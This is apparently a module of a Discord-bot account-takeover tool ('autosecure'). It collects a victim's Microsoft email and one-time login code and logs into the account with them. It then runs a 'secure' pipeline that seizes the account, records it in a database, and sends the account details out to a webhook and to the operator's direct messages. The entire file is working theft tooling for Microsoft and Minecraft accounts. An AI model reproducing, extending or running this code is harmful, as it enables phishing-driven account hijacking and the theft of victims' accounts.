/**
 * otpSecure.js — MS Auth OTP secure modal (extracted template)
 * Uses email + Microsoft OTP email code (NOT cookies/auth secret)
 *
 * Deploy to mainbot/modals/secure/ and register in mainbot.js:
 *   mod.registerModal('otpsecure', require('./modals/secure/otpSecure'));
 */

const validEmail = require('../../utils/emails/validEmail');
const login = require('../../utils/secure/login');
const secure = require('../../utils/secure/recodesecure');
const listAccount = require("../../../autosecure/utils/accounts/listAccount");
const { queryParams } = require("../../../db/database");
const statsembed = require("../../../autosecure/utils/stats/statsembed");
const generateuid = require('../../utils/generateuid');
const { ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
const insertaccount = require("../../../db/insertaccount");
const mcregex = require("../../.././autosecure/utils/utils/mcregex");
const { failedembed } = require("../../utils/embeds/embedhandler");
const getCredentials = require("../../utils/info/getCredentials");
const { sendToWebhook } = require("../../../mainbot/utils/webhook");
const taskTracker = require('../../utils/process/taskTracker.js');
const { generateAndSendImage } = require('../../utils/imageHandler');

module.exports = {
    name: "otpsecure",
    userOnly: true,
    description: "Secure via email + Microsoft OTP code",
    fields: [
        {
            customId: "otp_email",
            label: "Microsoft Email",
            placeholder: "user@gmail.com",
            style: 1,
            required: true,
            maxLength: 255,
        },
        {
            customId: "otp_code",
            label: "OTP Code (6 digits)",
            placeholder: "123456",
            style: 1,
            required: true,
            maxLength: 6,
            minLength: 6,
        },
        {
            customId: "otp_mcign",
            label: "Minecraft Username (optional)",
            placeholder: "Notch",
            style: 1,
            required: false,
            maxLength: 16,
        },
    ],

    callback: async (client, interaction) => {
        const email = interaction.fields.getTextInputValue('otp_email')?.trim() || "";
        const otp = interaction.fields.getTextInputValue('otp_code')?.trim() || "";
        const mcign = interaction.fields.getTextInputValue('otp_mcign')?.trim() || null;

        if (!validEmail(email)) {
            return interaction.editReply({
                embeds: [{
                    title: "Invalid Email",
                    description: "Please provide a valid Microsoft email address.",
                    color: 0xfa4343,
                }],
            });
        }

        if (!/^\d{6}$/.test(otp)) {
            return interaction.editReply({
                embeds: [{
                    title: "Invalid OTP",
                    description: "OTP must be exactly 6 digits.",
                    color: 0xfa4343,
                }],
            });
        }

        if (mcign && !mcregex(mcign)) {
            return interaction.editReply("Invalid Minecraft username.");
        }

        const settings = await client.queryParams(
            `SELECT * FROM secureconfig WHERE user_id=?`,
            [interaction.user.id]
        );

        if (settings.length === 0) {
            return interaction.editReply({
                embeds: [{
                    title: "No Settings Found",
                    description: "Configure your secure settings first with `/settings`.",
                    color: 0xfa4343,
                }],
            });
        }

        await interaction.deferReply({ ephemeral: true });

        const data = await getCredentials(email, false);
        if (!data?.Credentials?.OtcLoginEligibleProofs?.length) {
            return interaction.editReply({
                content: "Email does not have OTP login enabled or doesn't exist.",
            });
        }

        for (const sec of data.Credentials.OtcLoginEligibleProofs) {
            const host = await login({ email, id: sec.data, code: otp }, data);
            if (!host) continue;

            const expireTimestamp = Math.floor(Date.now() / 1000 + 900);
            const uid = await generateuid();
            await taskTracker.initTask(uid, 'otp', { email });

            const embed = new EmbedBuilder()
                .setTitle('🔐 Securing account…')
                .setDescription(`Email: \`${email}\` · OTP login accepted. Full secure pipeline running…`)
                .setColor(0x5865F2)
                .setTimestamp();

            const components = [
                new ActionRowBuilder().addComponents(
                    new ButtonBuilder()
                        .setCustomId(`status|${uid}`)
                        .setLabel('Status')
                        .setStyle(ButtonStyle.Primary),
                    new ButtonBuilder()
                        .setCustomId(`task|${uid}`)
                        .setLabel('Task')
                        .setStyle(ButtonStyle.Success),
                ),
            ];

            await interaction.user.send({ embeds: [embed], components });
            await interaction.editReply({ embeds: [embed], components });

            try {
                const acc = await secure(host, settings[0], uid, mcign);
                const inserted = insertaccount(acc, uid, client.username, settings[0].secureifnomc);

                const failedmsg = await failedembed(acc, uid);
                if (failedmsg.failed) {
                    sendToWebhook(failedmsg.failedmsg);
                    await interaction.followUp(failedmsg.failedmsg);
                    await interaction.user.send(failedmsg.failedmsg);
                    return;
                }

                if (acc.newName === "No Minecraft!") {
                    const accountmessage = await listAccount(acc, uid, client, interaction);
                    sendToWebhook(accountmessage);
                    await interaction.user.send(accountmessage);
                    return;
                }

                const statsoverview = await statsembed(client, acc, interaction);
                const accountmessage = await listAccount(acc, uid, client, interaction);
                sendToWebhook(accountmessage);

                if (statsoverview) {
                    await interaction.user.send(statsoverview);
                }
                await interaction.user.send(accountmessage);
                await generateAndSendImage(acc, interaction);
            } catch (err) {
                console.error("[OTP_SECURE]", err);
                await interaction.editReply({
                    embeds: [{
                        title: "Securing Failed",
                        description: "An error occurred. Use the Status button to re-authenticate.",
                        color: 0xfa4343,
                    }],
                });
            }
            return;
        }

        await interaction.editReply({ content: "Failed to login with OTP." });
    },
};
